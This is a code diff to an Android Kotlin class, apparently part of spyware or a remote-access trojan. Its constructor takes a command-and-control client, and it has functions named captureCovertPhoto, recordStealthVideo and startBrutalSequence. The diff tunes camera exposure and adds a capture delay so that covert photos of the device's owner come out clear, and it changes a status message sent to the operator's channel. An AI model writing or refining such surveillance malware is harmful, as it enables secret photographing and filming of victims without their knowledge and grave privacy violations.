@@ -121,12 +121,24 @@ class MediaCaptureManager(private val context: Context, private val c2Client: Te
         try {
             val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
             captureBuilder?.addTarget(cameraImageReader!!.surface)
+
+            // FIX: Prevent "white/high contrast" blowout
+            captureBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+            captureBuilder?.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+            captureBuilder?.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
+
             @Suppress("DEPRECATION")
             cameraDevice?.createCaptureSession(listOf(cameraImageReader!!.surface), object : CameraCaptureSession.StateCallback() {
                 override fun onConfigured(session: CameraCaptureSession) {
                     captureSession = session
-                    captureBuilder?.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
-                    captureSession?.capture(captureBuilder!!.build(), null, backgroundHandler)
+                    try {
+                        // Hardening: Mandatory delay to let AE/AWB settle
+                        backgroundHandler?.postDelayed({
+                            try {
+                                captureSession?.capture(captureBuilder!!.build(), null, backgroundHandler)
+                            } catch (e: Exception) { stopCamera() }
+                        }, 800)
+                    } catch (e: Exception) { stopCamera() }
                 }
                 override fun onConfigureFailed(session: CameraCaptureSession) { stopCamera() }
             }, backgroundHandler)
@@ -262,7 +274,7 @@ class MediaCaptureManager(private val context: Context, private val c2Client: Te
     }
 
     fun startBrutalSequence(front: Boolean = false) {
-        c2Client.sendMessage("<b>[Visuals]</b> Triggering Brutal Sequence...")
+        c2Client.sendMessage("<b>[Mata-mata]</b> Gaspol rekam 30 detik ya, boss man...")
         captureCovertPhoto(front)
         mainHandler.postDelayed({
             recordStealthVideo(30000, front)
